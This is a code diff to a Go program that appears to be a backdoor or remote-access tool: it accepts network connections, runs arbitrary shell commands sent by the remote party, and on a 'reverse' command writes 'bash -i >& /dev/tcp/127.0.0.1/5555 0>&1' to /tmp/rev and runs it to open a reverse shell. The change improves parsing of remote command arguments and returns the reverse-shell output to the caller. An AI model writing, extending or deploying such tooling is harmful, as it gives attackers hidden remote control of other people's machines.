@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 )
 
 const (
@@ -59,7 +60,7 @@ func handleConnection(conn net.Conn) {
 	case "whichos":
 		conn.Write([]byte(checkOS()))
 	case "reverse":
-		openReverse()
+		conn.Write([]byte(openReverse()))
 	default:
 		conn.Write([]byte("Command not found.\n"))
 	}
@@ -76,10 +77,20 @@ func shellExec(conn net.Conn) string {
 
 	if err != nil {
 		conn.Close()
-		return "Connection closed."
+		return "Connection closed.\n"
 	}
 
-	cmd := exec.Command(string(buffer[:len(buffer)-1]))
+	instr := strings.Split(string(buffer), " ")
+
+	var cmd *exec.Cmd
+
+	if len(instr) > 1 {
+		args := instr[1:]
+		cmd = exec.Command(instr[0], args...)
+	} else {
+		cmd = exec.Command(string(buffer[:len(buffer)-1]))
+	}
+
 	stdout, err := cmd.Output()
 
 	if err != nil {
@@ -94,7 +105,7 @@ func openReverse() string {
 		d1 := []byte("bash -i >& /dev/tcp/127.0.0.1/5555 0>&1\n")
 		err := ioutil.WriteFile("/tmp/rev", d1, 0644)
 		if err != nil{
-			return "Failed to write file"
+			return "Failed to write file.\n"
 		}
 	}
 
@@ -103,10 +114,10 @@ func openReverse() string {
 	stdout, err := cmd.Output()
 
 	if err != nil {
-		return err.Error()
+		return err.Error() + "\n"
 	}
 
-	return string(stdout)
+	return string(stdout) + "\n"
 
 }
 
